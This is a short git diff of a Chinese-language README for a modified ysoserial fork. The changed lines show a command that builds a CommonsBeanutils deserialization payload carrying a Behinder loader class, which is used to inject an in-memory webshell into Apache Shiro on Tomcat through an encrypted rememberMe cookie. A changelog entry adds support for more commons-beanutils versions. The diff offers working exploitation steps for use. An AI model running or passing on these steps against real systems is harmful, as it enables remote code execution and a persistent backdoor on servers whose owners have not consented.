@@ -4,11 +4,12 @@
 打包命令
 
 ` mvn clean package -DskipTests`
+
 ### shiro 内存马注入
 
 使用对应链进行生成反序列化文件
 
-`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 classfile:./Poc/shell/BehinderLoader.class > demo.ser`
+`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_183 classfile:./Poc/shell/BehinderLoader.class > demo.ser`
 
 指定加密模式和反序列化文件生成对应的 rememberMe
 
@@ -16,7 +17,9 @@
 
 
 ### 更新日志
+2021.0527 利用 classloader 实现了依赖隔离，支持 cb 1.9.2 和 cb 1.8.3 (基于 c0ny1 师傅的思路)
 2021.0525 可以引入构造好的 class 直接进行 shiro Tomcat 内存马注入，同时可直接调用加密函数进行加密
+
 
 
 [![Join the chat at https://gitter.im/frohoff/ysoserial](
